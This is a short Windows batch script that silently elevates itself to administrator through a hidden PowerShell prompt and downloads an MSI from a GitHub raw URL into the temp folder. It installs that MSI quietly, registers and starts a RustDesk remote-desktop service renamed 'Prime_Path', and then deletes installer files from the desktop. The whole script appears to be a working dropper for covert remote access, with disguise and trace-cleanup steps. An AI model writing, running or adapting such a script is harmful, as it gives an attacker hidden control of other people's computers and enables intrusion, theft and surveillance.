@echo off
setlocal

:: === AUTO-ELEVATE SILENTLY ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs -WindowStyle Hidden"
    exit /b
)

:: === DOWNLOAD AND INSTALL MSI SILENTLY ===
cd /d %temp%
curl -s -L -O https://raw.githubusercontent.com/hgnstorev2/tresdf/main/Prime_Path.msi >nul 2>&1

if exist "%temp%\Prime_Path.msi" (
    msiexec /i "%temp%\Prime_Path.msi" /qn /norestart >nul 2>&1
) else (
    echo Failed to download Prime_Path.msi
    exit /b
)

:: === LOCATE AND INSTALL RUSTDESK SERVICE ===
set "rustdeskPath="
for /d %%a in ("C:\Program Files*\Prime_Path") do (
    if exist "%%a\Prime_Path.exe" (
        set "rustdeskPath=%%a\Prime_Path.exe"
    )
)

if defined rustdeskPath (
    call "%rustdeskPath%" --install >nul 2>&1
    sc start rustdesk >nul 2>&1
)

:: === DELETE RUSTDESK SHORTCUTS OR INSTALLER FROM DESKTOP ===
set "desktopPath=%USERPROFILE%\Desktop"
del /f /q "%desktopPath%\Prime_Path.msi" >nul 2>&1
del /f /q "%desktopPath%\Prime_Path*.exe" >nul 2>&1
del /f /q "%desktopPath%\Prime_Path*.msi" >nul 2>&1

exit /b
